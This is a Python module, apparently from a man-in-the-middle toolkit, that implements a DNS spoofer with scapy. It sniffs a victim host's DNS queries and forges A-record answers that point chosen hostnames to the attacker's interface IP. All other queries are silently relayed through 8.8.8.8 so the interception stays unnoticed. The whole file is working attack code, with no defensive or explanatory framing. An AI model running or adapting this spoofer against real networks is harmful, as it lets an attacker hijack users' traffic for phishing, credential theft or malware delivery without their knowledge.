import logging
from scapy.all import conf, sniff, IP, UDP, DNS, DNSRR, get_if_addr, send, ETH_P_ALL, sr1, Ether
import re
import socket
from services.service import Service

class DNSService(Service):
    def start(self):
        # Bind an actual socket to the dns listen port such that packets will actually arrive properly
        # after IPTables has applied it's redirect rule
        sock = socket.socket(socket.AF_INET, # Internet
                          socket.SOCK_DGRAM) # UDP
        sock.bind(('0.0.0.0', self.config.dns_listen_port))

        logging.warning("[DNS] Started DNS spoofer")

        sniff(
            filter="udp port 53 and src host " + self.config.victim.getIP(),
            prn=self.print_packet,
            stop_filter=self.should_stop_after_packet
        )

    def should_stop_after_packet(self, packet):
        return self.shouldStop()

    def print_packet(self, packet):
        ip = packet.getlayer(IP)
        udp = packet.getlayer(UDP)
        dns = packet.getlayer(DNS)
        
        # standard (a record) dns query
        if dns.qr == 0 and dns.opcode == 0:
            queried_host = dns.qd.qname[:-1].decode()
            dns_answer = None
            match = False
            for hostname in self.config.hostnames:
                regex = '^'+ re.escape(hostname).replace('\\*\\*','.*').replace('\\*','[^\.]+') +'$'
                match = bool(re.match(regex, queried_host))
                if match:
                    break

            if not match:
                try:
                    logging.warning("[DNS] Querying: " + queried_host)
                    dns_req = IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1, qd=dns.qd)
                    answer = sr1(dns_req, verbose=0, timeout=3)
                    answer[DNS].id = dns.id
                    dns_reply = IP(src=ip.dst, dst=ip.src) / \
                            UDP(sport=udp.dport,
                                    dport=udp.sport) / \
                            answer[DNS]
                    logging.warning("[DNS] Responding: " + queried_host)
                    send(dns_reply, iface=self.config.iface, verbose=False)
                except:
                    logging.warning("[DNS] Failed to resolve host: " + queried_host)
            else:
                resolved_ip = get_if_addr(self.config.iface)
                dns_answer = DNSRR(rrname=queried_host + ".",
                                        ttl=330,
                                        type="A",
                                        rclass="IN",
                                        rdata=resolved_ip)
                dns_reply = IP(src=ip.dst, dst=ip.src) / \
                            UDP(sport=udp.dport,
                                    dport=udp.sport) / \
                            DNS(
                                id = dns.id,
                                qr = 1,
                                aa = 0,
                                rcode = 0,
                                qd = dns.qd,
                                an = dns_answer
                            )
                send(dns_reply, iface=self.config.iface, verbose=False)

                logging.debug("[DNS] Sent %s has %s to %s" % (queried_host,
                                                dns_answer.rdata,
                                                ip.src))